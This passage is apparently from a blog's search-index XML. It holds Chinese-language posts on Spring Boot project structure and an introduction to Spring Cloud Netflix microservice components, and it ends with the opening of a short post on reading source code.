有点类似junit服务，就是一个测试的地方，springboot直接将这个整合进来，很方便 pom.xml 这个其实没什么好说的，就是maven资源管理的文件，所有的依赖就是写在这里的 讲完了，一些后话这个教程不是完全针对0基础的初学者的，正如我说的，你需要足够的知识储备才建议去学习springboot，当然了也有一些名词是大家没有听说过的但是，稍安勿躁，大家目前需要大致的了解，对于一些特定的内容比如模板引擎，日志驱动sel4j等一系列内容都会出教程。]]></content>
  </entry>
  <entry>
    <title><![CDATA[SpringCloud-Netflix-01-微服务简介]]></title>
    <url>%2F2019%2F03%2F23%2FSpringCloud-Netflix-01-%E7%AE%80%E8%BF%B0%2F</url>
    <content type="text"><![CDATA[说在前面的话经历了springboot的单体地狱之后。直接进军springcloud系列，开始着手接触微服务这个新世界，很好，javaweb仍然在颠覆我之前的学习。 微服务目前微服务的三套方案 springcloud-netflix ：影响力极大的一个微服务解决方案 springcloud-alibaba ： 阿里巴巴公司的一套微服务生态 dubbo + zoomkeeper ： 效果奇佳的决绝方案，但是确实部分机制，需要第三方 简介谈起微服务，不得不说起分布式架构的东西，从开始接触微服务，其实才真正的迈入高性能开发的世界，不得不说，如果springboot是自动装配的完美题，那么微服务架构才是真正面向当今大型网络的开发方式，代码的管理不再是面向模块的编程而是面向项目编程，更加准确的说是面向服务编程。 顾名思义微服无就是，更小的服务，和物理所学的微元法相似，把一个大型的互联网项目拆分成一个个小读注册项目，这样实现大型的功能需求，而且通过高并发，高可用的机制，同时伴随gitlab的使用，成为一个真正的云端开发项目 微服务和分布式解决的问题我们总是说微服务，谈论分布式，可是说到及微服务和分布式到底解决了什么问题呢。 分布式解决的问题分布式架构的提出，解决了单体应用低聚合，高耦合的问题，单体应用会导致单一的项目代码过度繁杂，耦合度高，而且无法实现高并发，高可用的效果，所以分布式架构的提出，就是为了击破传统的构建项目方式。 微服务解决的问题 服务的通信 对应用服务的拆分 服务应用的部署访问 服务的熔断处理 springcloud微服务构建依赖统一管理对于springboot项目，我们常常使用maven作为管理工具，在单体应用中，maven管理jar包依赖，为我们节省了很多的事情，但是，面对微服务，我们面对将会是是大量的项目，成百上千，如果反复一个项目一个项目的配置依赖环境，那么势必会造成很多的冗余依赖，所以提取出共享的依赖统一集中管理，这样才能有更高的效率和更好的管理方式。 服务注册与发现微服务拆分了太多的小项目，但是是多个服务集中去处理一套事务，因此我们需要存在某种中间件去管理所有的微服务项目，这就是服务注册与发现。用此来保证我们的服务管理和集成。Netflix中则是EurekaServer。 服务提供者既然存在了服务的管理机制，那么我们就开始向我们的事务，提供服务了，这里有EurekaClient来作为服务的提供者 服务消费者既然有服务提供者，必然存在服务的消费者，用大量的消费者来完成我们的事务的需求。Ribbon，Feign。 服务熔断还是回到微服务问题，大量服务的出现，我们不可能保证每一个服务都是可以正常的，不会发生宕机的，因此我们需要对宕机的程序进行管理，自动终止，我们称之为熔断机制。Hystrix 服务追踪服务追踪，其实简单的说就是服务的监控，对于每一个服务的流量等问题进行集中的监控 ，致力于收集服务的定时数据，以解决微服务架构中的延迟问题，包括数据的收集、存储、查找和展现。ZipKin #### 使用路由网关实现统一访问接口每一个微服务都有相对应的端口，每一次的配置我们如果一一对应那么势必变得极其繁琐，我们希望用一个统一的路由网关去管理不同的微服务，如此才能更加简化配置信息，而配置信息则存储在ｇitlab上，这样方便多人开发去使用不同的项目配置。 SpringCloud-Netflix目前的情况2018年12月12日，Netflix宣布Spring Cloud Netflix 系列技术栈进入维护模式（不再添加新特性）最近，Netflix 宣布 Hystrix 正在进入维护模式。自 2016 年以来，Ribbon 已处于类似状态。虽然 Hystrix 和 Ribbon 现已处于维护模式，但它们仍然在 Netflix 大规模部署。Hystrix Dashboard 和 Turbine 已被 Atlas 取代。这些项目的最后一次提交分别是 2 年前和 4 年前。Zuul1 和 Archaius1 都被后来不兼容的版本所取代。 简介Spring Cloud 为开发人员提供了快速构建分布式系统中一些常见模式的工具（例如配置管理，服务发现，断路器，智能路由，微代理，控制总线）。分布式系统的协调导致了样板模式, 使用 Spring Cloud 开发人员可以快速地支持实现这些模式的服务和应用程序。他们将在任何分布式环境中运行良好，包括开发人员自己的笔记本电脑，裸机数据中心，以及 Cloud Foundry 等托管平台。]]></content>
  </entry>
  <entry>
    <title><![CDATA[源码阅读分享]]></title>
    <url>%2F2019%2F03%2F23%2FSourceRead%2F</url>
    <content type="text"><![CDATA[说在前面的话从学习java web开始到现在，也算是一个老油条了，但是学完之后确实存在一些失落，更多读觉得自己只是在照猫画虎，没有深层的东西，这里开始分享一些源码读阅读或者文章给大家呈现]]></content>
  </entry>
</search>
